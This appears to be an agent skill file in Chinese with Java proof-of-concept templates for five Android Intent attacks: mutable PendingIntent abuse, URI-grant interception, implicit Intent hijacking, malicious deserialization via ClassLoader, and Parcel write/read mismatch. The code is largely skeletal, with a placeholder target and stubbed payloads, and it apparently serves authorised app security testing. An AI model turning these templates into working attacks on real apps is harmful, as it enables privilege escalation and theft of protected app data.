---
name: poc-app-intent
description: Intent 攻击 PoC — 覆盖 PendingIntent 提权、URI 权限滥用、隐式 Intent 劫持、ClassLoader 注入、Parcel 不匹配 5 种漏洞类型
---

# Intent 攻击 PoC

Intent 是组件间通信的核心机制，也是数据流传播通道。攻击面包括 PendingIntent 提权、URI 权限授予滥用、隐式 Intent 劫持等。

## 漏洞类型索引

| 漏洞 | 等级 | PoC 类名 |
|------|------|---------|
| PendingIntent 权限提升 | HIGH | `IntentPendingIntentEscalationExploit` |
| URI 权限授予滥用 | HIGH | `IntentUriPermissionExploit` |
| 隐式 Intent 劫持 | MEDIUM | `IntentImplicitHijackExploit` |
| ClassLoader 注入 | HIGH | `IntentClassloaderInjectExploit` |
| Parcel 不匹配攻击 | HIGH | `IntentParcelMismatchExploit` |

## IntentPendingIntentEscalationExploit

获取目标暴露的 FLAG_MUTABLE PendingIntent，填充恶意 Intent 以目标身份执行。

```java
public class IntentPendingIntentEscalationExploit extends Exploit {
    @Override
    public void execute() {
        // 1. 从目标暴露位置获取 PendingIntent
        PendingIntent pendingIntent = obtainTargetPendingIntent();
        if (pendingIntent == null) {
            log("Failed to obtain PendingIntent");
            return;
        }

        // 2. 填充恶意 Intent
        Intent fillIntent = new Intent();
        fillIntent.setClassName("com.target", "com.target.PrivilegedActivity");
        fillIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);

        // 3. 以目标 app 身份执行
        try {
            pendingIntent.send(context, 0, fillIntent);
            log("PendingIntent sent — executed as target app");
        } catch (Exception e) {
            log("Send failed: " + e.getMessage());
        }
    }

    /**
     * PendingIntent 常见获取来源：
     * - 通知 Notification.actions[].actionIntent
     * - App Widget RemoteViews.setPendingIntentTemplate
     * - ContentProvider query 返回
     * - IPC 传递（Bundle / Intent extra）
     */
    private PendingIntent obtainTargetPendingIntent() {
        // 按实际漏洞场景实现
        return null;
    }
}
```

## IntentUriPermissionExploit

拦截携带 FLAG_GRANT_READ/WRITE_URI_PERMISSION 的隐式 Intent，获取对目标 content URI 的临时访问权限。

```java
public class IntentUriPermissionExploit extends Exploit {
    @Override
    public void execute() {
        // 1. 注册高优先级 Activity 拦截隐式 Intent
        // Manifest 中声明 intent-filter 匹配目标 action
        // 2. 在 onReceive / onActivityResult 中获取 URI 权限

        // 直接模拟：通过目标已暴露的 URI 访问数据
        // 场景：目标通过 sendBroadcast 或 startActivity 传递了带 GRANT flag 的 URI
        Uri targetUri = Uri.parse("content://com.target.provider/sensitive_data");

        try {
            // 尝试直接访问（如果已获得 URI 权限）
            Cursor cursor = context.getContentResolver().query(targetUri, null, null, null, null);
            if (cursor != null) {
                log("Accessed protected URI — rows: " + cursor.getCount());
                cursor.close();
            }
        } catch (SecurityException e) {
            log("No URI permission — need to intercept the granting Intent");
        }
    }
}
```

## IntentImplicitHijackExploit

注册同 action 的高优先级组件，劫持隐式 Intent。

```java
public class IntentImplicitHijackExploit extends Exploit {
    @Override
    public void execute() {
        // PoC Manifest 中声明相同 action 的 intent-filter：
        // <intent-filter android:priority="999">
        //     <action android:name="com.target.SENSITIVE_ACTION" />
        // </intent-filter>

        // 触发目标发送隐式 Intent（如通过广播或启动流程）
        Intent trigger = new Intent("com.target.TRIGGER_ACTION");
        context.sendBroadcast(trigger);
        log("Waiting for implicit intent interception...");
    }
}
```

## IntentClassloaderInjectExploit

利用 getSerializableExtra 的不安全反序列化，通过 ClassLoader 注入执行恶意代码。

```java
public class IntentClassloaderInjectExploit extends Exploit {
    @Override
    public void execute() {
        Intent intent = new Intent();
        intent.setClassName("com.target", "com.target.DeserializeActivity");

        // 构造恶意序列化对象
        // 需在 PoC 中实现目标 ClassLoader 可加载的恶意类
        // 该类实现 Serializable 接口，在 readObject 中执行恶意操作
        try {
            // intent.putExtra("serializable_obj", maliciousObject);
            log("ClassLoader inject — requires custom Serializable payload class");
            log("Payload class must be loadable by target's ClassLoader");
        } catch (Exception e) {
            log("Payload construction failed: " + e.getMessage());
        }

        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        context.startActivity(intent);
    }
}
```

## IntentParcelMismatchExploit

利用 Bundle write/read 不对称绕过 checkKeyIntent 校验。

```java
public class IntentParcelMismatchExploit extends Exploit {
    @Override
    public void execute() {
        // 高级攻击：构造恶意 Parcel 数据
        // 通过 Bundle 的 write/read 不一致绕过 Intent 校验
        // 需要精确构造 Parcel offset 使校验通过但执行不同 Intent

        Intent intent = new Intent();
        intent.setClassName("com.target", "com.target.IntentProcessingActivity");

        // 构造恶意 Bundle
        Bundle bundle = new Bundle();
        // 利用 Parcel 机制的不对称性
        // 具体构造方式取决于目标校验逻辑

        intent.putExtra("extra_bundle", bundle);
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        context.startActivity(intent);
        log("Parcel mismatch — requires custom Parcel construction");
    }
}
```
